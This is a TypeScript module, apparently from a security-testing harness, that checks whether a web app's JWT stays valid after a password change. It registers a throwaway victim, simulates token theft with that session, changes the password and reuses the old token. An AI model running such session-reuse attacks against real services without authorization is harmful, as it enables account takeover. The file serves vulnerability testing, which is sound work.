/**
 * Ataque real: el JWT robado sigue vivo después de que la víctima cambia su
 * contraseña. Simula el robo de token, el cambio de contraseña de la víctima, y
 * demuestra que el token pre-cambio sigue autenticando (el escenario clave:
 * "creí que lo había resuelto").
 *
 * Usa una cuenta desechable como "víctima" para no tocar datos seed.
 */
import { CATALOG } from '../catalog.ts';
import { decodeJwt, reqLine } from '../../../core/http.ts';
import { hex } from '../../../core/rng.ts';
import { registerThrowaway } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../../../core/types.ts';

export const jwtReuse: Attack = {
  meta: CATALOG['jwt-not-invalidated-on-password-change'],
  mutating: true, // crea una cuenta víctima y le cambia la contraseña
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];

    // 1. Preparamos una "víctima" desechable y simulamos el token robado.
    const victim = await registerThrowaway(ctx);
    const stolenToken = victim.token;
    const iatBefore = decodeJwt(stolenToken)?.iat as number | undefined;
    steps.push({
      technique: 'Robo de token de sesión (simulado)',
      mitre: ['T1528'],
      request: reqLine('POST', '/api/auth/register'),
      response_summary: `el atacante obtiene un JWT de la víctima (iat=${iatBefore})`,
      note: 'En un incidente real el token se roba por XSS, phishing o un HAR; aquí lo representamos con una sesión legítima de la víctima.',
    });

    // 2. Confirmamos que el token sirve ANTES del cambio de contraseña.
    const before = await ctx.http.get('/api/users/me', { token: stolenToken });
    steps.push({
      technique: 'Uso del token robado',
      mitre: ['T1550.001'],
      request: reqLine('GET', '/api/users/me'),
      response_summary: `HTTP ${before.status} — el token autentica`,
      exchange: before.exchange,
    });

    // 3. La víctima "reacciona" cambiando su contraseña.
    await new Promise((r) => setTimeout(r, 1100)); // separa el iat del password_changed
    const change = await ctx.http.post(
      '/api/users/me/password',
      { current_password: victim.password, new_password: `Nuevo-${hex(ctx.rng, 8)}!` },
      { token: stolenToken },
    );
    steps.push({
      technique: 'Reacción de la víctima: cambio de contraseña',
      request: reqLine('POST', '/api/users/me/password'),
      response_summary: `HTTP ${change.status} — contraseña cambiada`,
      exchange: change.exchange,
      note: 'Aquí el developer suele creer que ya expulsó al atacante.',
    });

    // 4. ¿El token PRE-cambio sigue sirviendo? Esa es la vulnerabilidad.
    const after = await ctx.http.get('/api/users/me', { token: stolenToken });
    const stillValid = after.status === 200;
    steps.push({
      technique: 'Reutilización del token tras el cambio de contraseña',
      mitre: ['T1550.001'],
      request: reqLine('GET', '/api/users/me'),
      response_summary: `HTTP ${after.status} — ${stillValid ? 'el token robado SIGUE vivo' : 'el token fue invalidado'}`,
      exchange: after.exchange,
      note: stillValid
        ? 'El token con iat anterior al password_changed sigue autenticando: el atacante nunca salió.'
        : undefined,
    });

    return {
      vuln_id: jwtReuse.meta.id,
      confirmed: stillValid,
      blocked: !stillValid,
      steps,
      gained: stillValid ? ['sesión persistente que sobrevive al cambio de contraseña'] : [],
      foothold: stillValid ? { type: 'jwt', detail: `JWT con iat=${iatBefore}, válido ~30 días` } : undefined,
      attacker_active: stillValid,
      summary: stillValid
        ? 'Cambiar la contraseña NO invalidó el JWT ya emitido. Solo rotar JWT_SECRET expulsa al atacante.'
        : 'El cambio de contraseña invalidó el token: no es explotable.',
    };
  },
};
